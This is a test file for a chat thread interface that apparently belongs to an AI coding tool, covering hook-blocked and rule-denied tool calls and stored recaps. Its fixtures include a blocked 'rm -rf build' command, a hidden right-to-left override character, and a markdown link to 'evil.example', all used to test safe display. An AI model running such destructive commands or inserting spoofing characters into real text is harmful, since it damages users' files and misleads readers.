      threadOf({
        ...liveOutcomeSample('completed', 'work'),
        entries: [user('Clean', 900), tool, end('end_turn', 2_000)],
      }),
    );
    const row = [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')].find((b) =>
      (b.getAttribute('aria-label') ?? '').startsWith(`${CHAT.hook.blockedWord}, rm -rf build`),
    );
    expect(row?.getAttribute('aria-label')).toContain(CHAT.hook.blockedBy);
    act(() => row!.click());
    expect(container.querySelector('[data-blocked]')?.textContent).toBe(`${RM} \\u{202E}x`);
    expect(container.textContent).not.toContain('Hook denied');
    expect(container.textContent).not.toContain(CHAT.noOutput);
  });

  it('any other call a hook blocked reads Blocked · by a hook and opens to the words as its output', () => {
    const tool: Tool = { ...runningTool, status: 'failed', output: 'Hook denied: no', blocked: RM };
    const container = mount(threadOf(work([tool, end('end_turn', NOW)], false)));
    const row = [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')].find((b) =>
      (b.getAttribute('aria-label') ?? '').startsWith('probe'),
    );
    expect(row?.getAttribute('aria-label')).toContain(CHAT.hook.blockedRow);
    expect(row?.getAttribute('aria-expanded')).toBe('true');
    expect(container.textContent).toContain(RM);
    expect(container.textContent).not.toContain('Hook denied');
  });

  // Mutation: drop `ts={counted ? undefined : entry.ts}` → the first time shows beside "last".
  it('a failed hook: once, a warning with its time and the error; 12 times, the count and the newest time instead', () => {
    const container = mount(threadOf(work([failedHook(), answer('ok', NOW - 1_000), end('end_turn', NOW)], false)));
    const rows = () => [...container.querySelectorAll<HTMLElement>('[data-notice-row="hook"]')];
    expect(rows()[0]!.textContent).toBe(
      `${CHAT.hook.failed}global/lint · before the command${formatClock(NOW - 30_000)}exit status 2`,
    );
    expect(rows()[0]!.querySelector('[data-tone]')?.getAttribute('data-tone')).toBe('warning');
    rerender(threadOf(work([failedHook({ times: 12, lastTs: NOW - 2_000 }), end('end_turn', NOW)], false)));
    expect(rows()[0]!.textContent).toBe(
      `${CHAT.hook.failed}global/lint · before the command12 times · last ${formatClock(NOW - 2_000)}exit status 2`,
    );
    const note: TranscriptEntry = { kind: 'notice', ts: NOW - 3_000, code: 'hook-note', text: 'Stop blocked by hook' };
    rerender(threadOf(work([note, end('end_turn', NOW)], false)));
    const [noteRow] = [...container.querySelectorAll<HTMLElement>('[data-notice-row="hook-note"]')];
    expect(noteRow!.textContent).toBe(`${CHAT.hook.note}Stop blocked by hook${formatClock(NOW - 3_000)}`);
  });

  it('the live region reads a hook row that arrives live once; never one the thread opened with', () => {
    const onStatus = vi.fn();
    const base = [failedHook({ ts: NOW - 50_000 })];
    mount(threadOf(work(base), { onStatus, conversationId: 'c1' }));
    const said = () => onStatus.mock.calls.filter(([text]) => String(text).startsWith('Hook'));
    expect(said()).toEqual([]);
    const note: TranscriptEntry = { kind: 'notice', ts: NOW - 3_000, code: 'hook-note', text: 'Stop blocked' };
    rerender(threadOf(work([...base, failedHook({ hook: 'global/fmt' }), note]), { onStatus, conversationId: 'c1' }));
    expect(said()).toEqual([
      [`${CHAT.hook.failed}: global/fmt · before the command`],
      [`${CHAT.hook.note}: Stop blocked`],
    ]);
  });
});

describe('ChatThread: a recap (#17)', () => {
  const H = CHAT.history;
  const recap = (text: string, ts = T0 + 5_000): TranscriptEntry => ({ kind: 'recap', ts, text });
  const idle = (entries: TranscriptEntry[], lastEnd: ThreadSample['lastEnd'] = null): ThreadSample => ({
    mode: 'work',
    entries,
    turns: [metric()],
    turn: null,
    lastEnd,
  });
  const rows = (container: HTMLElement): HTMLElement[] => [
    ...container.querySelectorAll<HTMLElement>('[data-recap-row]'),
  ];
  const line = (container: HTMLElement): Element | null => container.querySelector('[data-recap-line]');

  // Mutation: draw the text through ChatMarkdown → the link and the bold come out as elements.
  it('a stored row: "Recap" and its time, the words as plain text with hidden characters shown; named for a reader', () => {
    const text = 'The fix is in. See [docs](https://evil.example) **now**‮.';
    const container = mount(threadOf(idle([user('Fix it'), answer('Done.'), end(), recap(text)])));
    const [row] = rows(container);
    expect(row).toBeDefined();
    expect(row!.tagName).toBe('ARTICLE');
    expect(row!.getAttribute('aria-label')).toBe(fill(H.recapName, { time: formatClock(T0 + 5_000) }));
    expect(row!.textContent).toContain(H.recap);
    expect(row!.querySelector('time')?.textContent).toBe(formatClock(T0 + 5_000));
    expect(row!.querySelector('p')!.textContent).toBe(
      'The fix is in. See [docs](https://evil.example) **now**\\u{202E}.',
    );
    expect(row!.querySelector('a')).toBeNull();
    expect(row!.querySelector('strong')).toBeNull();
  });

  // Mutation: drop 'recap' from isSideEntry → the wait line takes the step's time, not the turn's start.
  it('a recap is no step of an answer: the next answer waits on its own start, not the recap’s time', () => {
    const startedAt = Date.now() - 3_000;
    const container = mount(
      threadOf({
        mode: 'work',
        entries: [user('Fix it', startedAt - 120_000), end(), recap('Where we are.', startedAt - 60_000)],
        turns: [metric()],
        turn: { turnId: 't2', phase: 'running', startedAt, wait: null },
        lastEnd: null,
      }),
    );
    expect(rows(container)).toHaveLength(1);
    const clock = container.querySelector('[data-wait-line] [data-wait-clock]');
    expect(['0:03', '0:04']).toContain(clock?.textContent);
  });

  // Mutation: give the live end to the recap's own group → the Stopped line is drawn twice.
  it('the stopped answer before it keeps its footer line; the recap gets none', () => {
    const container = mount(
      threadOf(
        idle([user('Fix it'), answer('Half'), end('cancelled'), recap('Where we are.')], { outcome: 'cancelled' }),
      ),
    );
    const text = container.textContent ?? '';
    expect(text.split(CHAT.outcomes.cancelled).length - 1).toBe(1);
    expect(text).not.toContain(CHAT.outcomes['stopped-stored']);
    expect(text.indexOf(CHAT.outcomes.cancelled)).toBeLessThan(text.indexOf('Where we are.'));
    expect(rows(container)).toHaveLength(1);
  });

  // Mutation: show the line while an answer runs → two lines at the thread end.
  it('the wait line: "Writing a recap…" with its clock, said once; none while an answer runs', () => {
    const onStatus = vi.fn();
    const startedAt = T0 + 10_000;
    const container = mount(
      threadOf(idle([user('Fix it'), answer('Done.'), end()]), {
        recap: { startedAt },
        onStatus,
        asOfMs: startedAt + 7_000,
      }),
    );
    expect(waitText(line(container)?.querySelector('[data-wait-line]'))).toBe(H.recapWriting);
    expect(line(container)?.querySelector('[data-wait-clock]')).not.toBeNull();
    expect(onStatus.mock.calls).toEqual([[H.recapSaid]]);
    rerender(
      threadOf(
        {
          ...idle([user('Fix it'), answer('Done.'), end(), user('Next')]),
          turn: { turnId: 't2', phase: 'running', startedAt: startedAt + 8_000, wait: null },
        },
        { recap: { startedAt }, onStatus },
      ),
    );
    expect(line(container)).toBeNull();
    expect(container.querySelectorAll('[data-wait-line]')).toHaveLength(1);
  });

  // Mutation: say every recap of the first render → a reopened conversation reads its old recap.
  it('the live region reads a recap that arrives live once; never one the thread opened with', () => {
    const onStatus = vi.fn();
    const base = [user('Fix it'), answer('Done.'), end(), recap('Old one.')];
    mount(threadOf(idle(base), { onStatus, conversationId: 'c1' }));
    expect(onStatus).not.toHaveBeenCalled();
    rerender(threadOf(idle([...base, recap('New one.', T0 + 9_000)]), { onStatus, conversationId: 'c1' }));
    expect(onStatus.mock.calls).toEqual([[fill(H.recapStatus, { text: 'New one.' })]]);
    rerender(threadOf(idle([...base, recap('New one.', T0 + 9_000)]), { onStatus, conversationId: 'c1' }));
    expect(onStatus).toHaveBeenCalledTimes(1);
  });
});

describe('ChatThread: a call a never-allow rule denied (#14)', () => {
  const RULE = `n_${'c'.repeat(32)}`;
  const push: TranscriptEntry = {
    kind: 'tool',
    ts: T0 + 100,
    endTs: T0 + 110,
    id: 'call_push',
    name: 'run_terminal_command',
    title: 'git push origin',
    status: 'failed',
    input: '{"command":"git push origin"}',
    output: 'The user elected to avoid running the run_terminal_command tool. The tool was not executed.',
  };
  const note = (words: string, ts = T0 + 120): TranscriptEntry => ({
    kind: 'user',
    ts,
    text: `${NEVER_NOTE_HEAD}${words}${NEVER_NOTE_TAIL}`,
    promptIndex: null,
    note: true,
  });
  const sample = (running = false): ThreadSample => ({
    mode: 'work',
    entries: running
      ? [user('Ship it', T0), push, note('git push')]
      : [user('Ship it', T0), push, note('git push'), answer('Not pushed.', T0 + 200), end()],
    turns: [],
    turn: running ? { turnId: 't1', phase: 'running', startedAt: T0, wait: null } : null,
    lastEnd: null,
  });
  const mark = (words: string | null, ruleId: string | undefined = RULE): PermissionMark => ({
    kind: 'denied',
    at: T0 + 115,
    toolCallId: 'call_push',
    access: 'bash',
    by: 'rule',
    ...(ruleId === undefined ? {} : { ruleId }),
    words,
    card: null,
  });
  const row = (container: HTMLElement) =>
    [...container.querySelectorAll<HTMLButtonElement>('button[aria-expanded]')].find((b) =>
      (b.getAttribute('aria-label') ?? '').includes('git push origin'),
    )!;
  const removeLabel = fill(CHAT.never.removeLabel, { words: 'git push' });

  it.each([
    ['live', true],
    ['from disk', false],
  ])('%s: the row reads "Never allowed · git push"; the note is "Your rule" with Remove rule', async (_, running) => {
    const onRemoveRule = vi.fn(async () => undefined);
    const container = mount(threadOf(sample(running), { marks: [mark('git push')], onRemoveRule }));
    expect(row(container).getAttribute('aria-label')).toContain(fill(CHAT.never.row, { words: 'git push' }));
    expect(container.querySelector('[data-note-row]')).toBeNull();
    const ruleRow = container.querySelector<HTMLElement>('[data-rule-row]')!;
    expect(ruleRow.textContent).toContain(CHAT.never.ruleLine);
    expect(ruleRow.textContent).toContain(fill(CHAT.never.ruleText, { words: 'git push' }));
    expect(ruleRow.textContent).not.toContain(NEVER_NOTE_TAIL);
    act(() => byRole(ruleRow, 'button', removeLabel)!.click());
    expect(onRemoveRule).toHaveBeenCalledWith(RULE, 'git push');
    await waitFor(() => byRole(ruleRow, 'button', removeLabel)?.getAttribute('aria-busy') !== 'true');
  });

  it('a removed rule reads "rule removed", and its note keeps the words with no button', () => {
    const onRemoveRule = vi.fn(async () => undefined);
    const container = mount(threadOf(sample(), { marks: [mark('git push')], onRemoveRule }));
    rerender(threadOf(sample(), { marks: [mark(null)], onRemoveRule }));
    expect(row(container).getAttribute('aria-label')).toContain(CHAT.never.rowGone);
    expect(row(container).getAttribute('aria-label')).not.toContain(fill(CHAT.never.row, { words: 'git push' }));
    const ruleRow = container.querySelector<HTMLElement>('[data-rule-row]')!;
    expect(ruleRow.textContent).toContain(fill(CHAT.never.ruleText, { words: 'git push' }));
    expect(byRole(ruleRow, 'button', removeLabel)).toBeNull();
  });

  it('with no way to remove (Sessions, Chat) the rule row has no button; a note in other words stays "Your note"', () => {
    const container = mount(threadOf(sample(), { marks: [mark('git push')] }));
    expect(byRole(container.querySelector('[data-rule-row]')!, 'button', removeLabel)).toBeNull();
    const own: TranscriptEntry = {
      kind: 'user',
      ts: T0 + 120,
      text: 'use pnpm, not npm',
      promptIndex: null,
      note: true,
    };
    rerender(
      threadOf({ ...sample(), entries: [user('Ship it', T0), push, own, end()] }, { marks: [mark('git push')] }),
    );
    expect(container.querySelector('[data-rule-row]')).toBeNull();
    expect(container.querySelector('[data-note-row]')?.textContent).toContain('use pnpm, not npm');
  });

  it('a turn the loop guard stopped says so in its footer', () => {
    const container = mount(threadOf(liveOutcomeSample('never-loop', 'work')));
    expect(container.textContent).toContain(CHAT.outcomes['never-loop']);
  });
});
